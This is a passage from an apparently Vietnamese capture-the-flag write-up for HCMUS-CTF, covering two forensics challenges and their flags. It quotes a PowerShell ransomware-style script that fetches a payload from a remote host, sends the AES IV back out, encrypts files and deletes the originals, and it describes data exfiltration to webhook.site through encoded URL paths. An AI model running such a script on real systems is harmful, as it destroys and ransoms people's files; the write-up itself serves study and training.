        $encodedPayloadUrl = "http://192.168.193.52:50000/12345"
        $sendIVUrl = "http://192.168.193.52:50000/iv"
        $base64Payload = Invoke-WebRequest -Uri $encodedPayloadUrl | Select-Object -ExpandProperty Content
    
        $decodedPayload = [System.Text.Encoding]::UTF8.GetString(
            [System.Convert]::FromBase64String($base64Payload)
        )

        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($decodedPayload))

        $rijndaelTemp = [System.Security.Cryptography.RijndaelManaged]::Create()
        $iv = $rijndaelTemp.IV

        $ivBase64 = [System.Convert]::ToBase64String($iv)
        $body = @{ iv = $ivBase64 } | ConvertTo-Json

        Invoke-WebRequest -Uri $sendIVUrl -Method POST -Body $body -ContentType "application/json"

        $rijndael = New-Object System.Security.Cryptography.RijndaelManaged
        $rijndael.Key = $key
        $rijndael.IV = $iv
        $rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        foreach ($directory in $targetDirectories) {
            Get-ChildItem -Path $directory -Recurse -File | ForEach-Object {
                if ($fileExtensionsToEncrypt -contains $_.Extension) {
                    $originalFile = $_.FullName
                    $encryptedFile = $originalFile -replace $_.Extension, ".hcmus"

                    $fileBytes = [System.IO.File]::ReadAllBytes($originalFile)
                    $encryptor = $rijndael.CreateEncryptor()
                    $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)

                    [System.IO.File]::WriteAllBytes($encryptedFile, $encryptedBytes)
                    Remove-Item $originalFile
                }
            }
        }
    
```

Script n√†y m√£ h√≥a **AES mode CBC** t·∫•t c·∫£ file c√≥ ƒëu√¥i `.txt` v·ªõi key l√† file `12345` ƒë∆∞·ª£c decode base64 v√† hash SHA 256 c√πng v·ªõi iv l√† file `iv` ƒë∆∞·ª£c decode base64 r·ªìi ƒë·ªïi ƒëu√¥i file b·ªã m√£ h√≥a sang `.hcmus`.

Nh·∫∑t h·∫øt ra ƒëem l√™n cyberchef gi·∫£i m√£:

![image](https://hackmd.io/_uploads/SJv9xQquex.png)

> `HCMUS-CTF{n3v3r_rUn_str4ng3r_f1l3s_adfx}`


### Forensics/Event Log

> Our web server detected suspicious activities and a potential leak of sensitive data.

Challenge y√™u c·∫ßu ph√¢n t√≠ch c√°c log h·ªá th·ªëng ƒë·ªÉ t√¨m ra d·∫•u hi·ªáu r√≤ r·ªâ d·ªØ li·ªáu nh·∫°y c·∫£m t·ª´ m√°y ch·ªß web.
Ph√¢n t√≠ch `squid.log` th√¨ ƒë√¢y l√† log c·ªßa proxy Squid ghi l·∫°i c√°c truy c·∫≠p web qua proxy.

![image](https://hackmd.io/_uploads/r1rpEQcOxx.png)

Quan s√°t ƒëi·ªÉm ƒë√°ng ng·ªù khi c√≥ nhi·ªÅu truy c·∫≠p ƒë·∫øn `webhook.site` t·ª´ c√°c IP n·ªôi b·ªô kh√°c nhau l√† d·∫•u hi·ªáu r√≤ r·ªâ d·ªØ li·ªáu.

> webhook.site l√† d·ªãch v·ª• cho ph√©p b·∫•t k·ª≥ ai t·∫°o m·ªôt endpoint ƒë·ªÉ nh·∫≠n d·ªØ li·ªáu t·ª´ b√™n ngo√†i
{. :prompt-info }

L·ªçc c√°c ƒëo·∫°n `webhook.site` ƒë·ªÉ ph√¢n t√≠ch:

```python
s = open('squid.log', 'r').readlines()
with open('webhook_site.log', 'w') as f:
    for line in s:
        if 'webhook.site' in line:
            f.write(line)
```

![image](https://hackmd.io/_uploads/ryvYSXcOxe.png)

C√≥ 7 ƒëo·∫°n cho th·∫•y ƒëang truy·ªÅn d·ªØ li·ªáu decode base64 t·ª´ng ph·∫ßn qua **URL path** ƒë·∫øn `webhook.site`. 

![image](https://hackmd.io/_uploads/H1ijw79Olg.png)

Format flag l√† `HCMUS-CTF{` n√™n guessing th·ª≠ xor v·ªõi key xem:

```python
from base64 import b64decode

data = open('webhook_site.log', 'r').readlines()
text = ''
for line in data:
    if 'text/html' in line:
        # print(line.split('/')[::-1][2].split('-')[0])
        text += line.split('/')[::-1][2].split(' -')[0]
print(text)
text = b64decode(text).decode()
pre = "HCMUS-CTF{"
for i in range(len(pre)):
    print(chr(ord(pre[i]) ^ ord(text[i])), end='')
# hcmusctf20
```

![image](https://hackmd.io/_uploads/BkkmuQ9dlg.png)

Key g·∫ßn ƒë√∫ng r·ªìi, brute ti·∫øp th√¨ key ƒë√∫ng l√† `hcmusctf2025`:

![image](https://hackmd.io/_uploads/ryqOdmc_lx.png)

> `HCMUS-CTF{3v3nt-1o9-n51nx-4nd-5qu1d-adfx}`
